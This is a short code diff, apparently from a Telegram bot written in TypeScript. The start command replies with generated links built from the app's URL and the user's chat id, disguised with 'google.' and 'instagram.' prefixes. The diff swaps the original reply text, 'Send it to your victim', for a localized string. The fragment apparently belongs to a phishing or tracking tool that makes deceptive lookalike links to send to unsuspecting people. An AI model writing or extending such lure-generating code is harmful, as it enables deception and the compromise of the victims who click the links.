@@ -8,7 +8,8 @@ export async function start(ctx: StartContext) {
 	const link = `${envs.APP_URL}/${ctx.chat.id}`;
 
 	await ctx.reply(
-		"Send it to your victim\n\n" +
+		ctx.t("start-command") +
+			"\n\n" +
 			"Google:\n" +
 			`https://google.${link}\n\n` +
 			"Instagram:\n" +
